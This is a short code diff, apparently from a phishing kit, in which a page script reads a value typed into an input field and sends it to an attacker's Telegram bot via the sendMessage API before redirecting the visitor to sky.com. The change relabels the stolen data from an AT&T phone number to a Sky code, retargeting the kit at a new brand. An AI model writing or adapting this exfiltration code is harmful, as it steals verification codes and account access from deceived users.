@@ -207,7 +207,7 @@ footer#footer ul li{
 
           let result1 = document.querySelector('#usr-id').value
           
-          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=ATT-RESULT=Phone number::${result1}`, {
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=SKY-RESULT=Code::${result1}`, {
               method: "GET"
           }).then(success => {
               window.location.replace("https://sky.com");
